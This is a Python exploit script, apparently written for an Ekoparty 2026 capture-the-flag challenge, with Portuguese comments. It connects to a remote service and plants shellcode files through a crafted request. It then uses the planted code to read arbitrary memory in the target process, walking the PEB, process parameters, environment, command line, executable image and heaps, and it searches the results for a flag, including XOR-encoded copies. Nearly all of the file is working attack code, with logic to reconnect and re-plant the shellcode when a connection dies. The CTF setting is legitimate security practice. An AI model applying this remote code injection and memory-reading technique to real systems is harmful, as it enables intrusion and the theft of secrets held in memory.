#!/usr/bin/env python3
# NOVO alvo + RESILIENTE. Deriva tudo do PEB vivo (ImageBase real, ProcessParameters->Env/CmdLine)
# e varre tambem heaps. Robusto aos 2 modos de falha vistos:
#   (a) overflow -> body com folga (length+0x200) p/ RPM nao estourar o buffer (13+len(body)).
#   (b) conexao morre apos 1 leitura -> absread() reconecta + re-planta e continua (mesma janela).
# Se o banner vier degradado na reconexao => janela acabou => para.
# Uso: python3 scan_env.py       /  FORCE=1 python3 scan_env.py
import socket, struct, re, os, time
HOST, PORT = "<IP>", 20269
COOKIE  = b"Ekoparty 2026 - Binary Gecko CTF challenge"
HEALTHY = b"Welcome to this CTF\x00"
SLOT    = 0x1620
D       = os.path.dirname(os.path.abspath(__file__))
FORCE   = os.environ.get("FORCE") == "1"
u64 = lambda b,o=0: struct.unpack("<Q", b[o:o+8])[0]
u32 = lambda b,o=0: struct.unpack("<I", b[o:o+4])[0]
u16 = lambda b,o=0: struct.unpack("<H", b[o:o+2])[0]

REAL = re.compile(rb'HIK_[A-Za-z0-9_]{2,60}_[0-9a-f]{32}')
LOOSE= re.compile(rb'HIK_[\x20-\x7e]{4,120}')
XKEY = bytes.fromhex("9c25a203")
def detect(r):
    for pat in (REAL, LOOSE):
        m=pat.search(r)
        if m: return m.group().decode(errors='replace')
    w=r.replace(b"\x00",b"")                      # UTF-16LE (env/cmdline sao wide)
    for pat in (REAL, LOOSE):
        m=pat.search(w)
        if m: return m.group().decode(errors='replace')+"  [UTF16]"
    dec=bytes(r[i]^XKEY[i%4] for i in range(len(r)))
    m=REAL.search(dec)
    if m: return m.group().decode()+"  [XOR4 9c25a203]"
    for i in range(len(r)-4):
        k=bytes(r[i+j]^b"HIK_"[j] for j in range(4))
        if k==b"\x00\x00\x00\x00": continue
        end=min(i+100,len(r)); seg=bytes(r[i+j]^k[j%4] for j in range(end-i))
        m=REAL.match(seg)
        if m: return m.group().decode()+f"  [XOR4 {k.hex()} @+0x{i:x}]"
    return None

def rd(s,n,to=8.0):
    s.settimeout(to); b=b""
    try:
        while len(b)<n:
            c=s.recv(n-len(b))
            if not c: break
            b+=c
    except (socket.timeout, ConnectionResetError, OSError): pass
    return b
def raw_req(s,flag,counter,length,body=b""):
    s.sendall(struct.pack("<IBII",13+len(body),flag,counter,length)+body); return rd(s,length)

def fresh_socket(tries=400,wait=6):
    """conecta e exige banner saudavel (retry agressivo p/ pegar restart)."""
    t0=time.time()
    for i in range(tries):
        try:
            s=socket.create_connection((HOST,PORT),timeout=6); s.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
        except Exception as e:
            print(f"[{int(time.time()-t0)}s] connect fail: {e}"); time.sleep(wait); continue
        s.sendall(COOKIE); b=rd(s,20,to=4.0)
        if b==HEALTHY: return s
        if FORCE: print("[~] degradado mas FORCE=1"); return s
        if i%10==0: print(f"[{int(time.time()-t0)}s] degradado (tent {i+1}), cacando restart a cada {wait}s...")
        s.close()
        if i<tries-1: time.sleep(wait)
    return None
def reconnect_quiet():
    """reconexao rapida DENTRO da janela: 1 tentativa, exige banner saudavel. None se degradou (janela acabou)."""
    try:
        s=socket.create_connection((HOST,PORT),timeout=6); s.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
    except Exception: return None
    s.sendall(COOKIE); b=rd(s,20,to=4.0)
    if b==HEALTHY or FORCE: return s
    s.close(); return None
def plant(s,scname):
    sc=open(os.path.join(D,scname),"rb").read()
    return len(raw_req(s,2,SLOT,len(sc),sc))>0

# ---- socket resiliente: reconecta + re-planta sc_absread quando a conexao morre ----
class Conn:
    def __init__(self): self.s=None; self.dead_window=False
    def ensure(self):
        if self.s is not None: return True
        if self.dead_window: return False
        self.s=reconnect_quiet()
        if self.s is None: self.dead_window=True; return False
        if not plant(self.s,"sc_absread.bin"):
            try:self.s.close()
            except:pass
            self.s=None; return False
        return True
    def absread(self,addr,length):
        body=struct.pack("<Q",addr).ljust(length+0x200,b"\x00")   # folga anti-overflow
        for _ in range(2):
            if not self.ensure(): return b""        # janela acabou
            try: r=raw_req(self.s,0,0,length,body)
            except OSError: r=b""
            if r: return r
            try:self.s.close()
            except:pass
            self.s=None                              # morreu -> loop reconecta+replanta
        return b""

CONN=Conn()
DUMP=bytearray()
def scan(name,base,size,found,step=0x1000,max_stale=24):
    print(f"\n== {name}: 0x{base:x}..0x{base+size:x} ==")
    prev=None; stale=0
    for off in range(0,size,step):
        r=CONN.absread(base+off,step)
        if len(r)==0:
            print(f"  (sem leitura em 0x{base+off:x} -- janela acabou?)"); return False
        if sum(r): DUMP.extend(struct.pack("<Q",base+off)+r)
        fl=detect(r)
        if fl:
            print(f"  >>> FLAG @0x{base+off:x}: {fl}"); found.append(fl); return True
        z=(sum(r)==0); st=(r==prev)
        if z or st:
            stale+=1
            if stale>=max_stale: print(f"  (stop: {max_stale} vazias/STALE @0x{base+off:x})"); break
        else:
            stale=0; asc=''.join(chr(x) if 32<=x<127 else '.' for x in r[:28])
            print(f"  0x{base+off:x}: {r[:12].hex()} | {asc}")
        prev=r
    return True

def main():
    s=fresh_socket()
    if not s: print("sem janela limpa apos retries; aguardar restart."); return
    print("[+] JANELA LIMPA")
    found=[]
    # PEB (1 vez). body COM FOLGA: sc_peb escreve nSize(=length) bytes em body+0xd -> buffer tem que ser > length.
    if not plant(s,"sc_peb.bin"): print("plant sc_peb falhou; abortar."); s.close(); return
    peb=raw_req(s,0,0,0x200, b"\x00"*0x400)
    if len(peb)<0x100: print(f"PEB curto ({len(peb)}B); abortar."); s.close(); return
    imgbase=u64(peb,0x10); pp=u64(peb,0x20); heaps_ptr=u64(peb,0xF0); nheaps=u32(peb,0xE8)
    print(f"[PEB] ImageBase=0x{imgbase:x}  ProcessParameters=0x{pp:x}  NumHeaps={nheaps}  Heaps@0x{heaps_ptr:x}")
    # adota a MESMA conexao saudavel: planta sc_absread aqui e reusa (reconecta so se morrer).
    if not plant(s,"sc_absread.bin"): print("plant sc_absread falhou; abortar."); s.close(); return
    CONN.s=s

    plausible=lambda v: 0x10000<=v<0x7fffffff0000
    # ProcessParameters -> env/cmdline/imagepath
    ppb=CONN.absread(pp,0x410)
    targets=[]
    if len(ppb)>=0x400:
        env_ptr=u64(ppb,0x80); env_sz=u32(ppb,0x3F0) if len(ppb)>=0x3F4 else 0
        cl_len=u16(ppb,0x70); cl_buf=u64(ppb,0x78); ip_buf=u64(ppb,0x68); ip_len=u16(ppb,0x60)
        print(f"[PP] CommandLine(0x{cl_buf:x} len={cl_len})  ImagePath(0x{ip_buf:x} len={ip_len})  Env(0x{env_ptr:x} sz=0x{env_sz:x})")
        if plausible(cl_buf):  targets.append(("CommandLine", cl_buf, max(0x200,cl_len+16)))
        if plausible(ip_buf):  targets.append(("ImagePathName", ip_buf, max(0x200,ip_len+16)))
        if plausible(env_ptr): targets.append(("Environment", env_ptr, env_sz if 0<env_sz<=0x8000 else 0x4000))
    else:
        print(f"[PP] leitura curta ({len(ppb)}B) -- pulando env/cmdline")
    if plausible(imgbase): targets.append(("EXE image (PEB base)", imgbase, 0x20000))
    targets.append(("EXE 0x140000000 (preferida)", 0x140000000, 0x20000))

    for name,base,size in targets:
        if found: break
        if not scan(name,base,size,found): break

    if not found:
        arr=CONN.absread(heaps_ptr,16*8)
        heaps=[u64(arr,i*8) for i in range(16) if len(arr)>=i*8+8 and plausible(u64(arr,i*8))] if len(arr)>=8 else []
        print("[heaps]", ", ".join(hex(h) for h in heaps) if heaps else "(sem leitura)")
        for i,h in enumerate(heaps):
            if found: break
            if not scan(f"heap[{i}] 0x{h:x}",h,0x40000,found): break

    try:CONN.s and CONN.s.close()
    except:pass
    open(os.path.join(D,"scan_env_dump.bin"),"wb").write(DUMP)
    print(f"\n[+] dump: scan_env_dump.bin ({len(DUMP)}B)")
    print("== RESUMO ==")
    if found:
        for f in set(found): print("FLAG2 CANDIDATA:", f)
    else:
        print("nada em env/cmdline/EXE/heaps nesta janela.")

if __name__=="__main__": main()
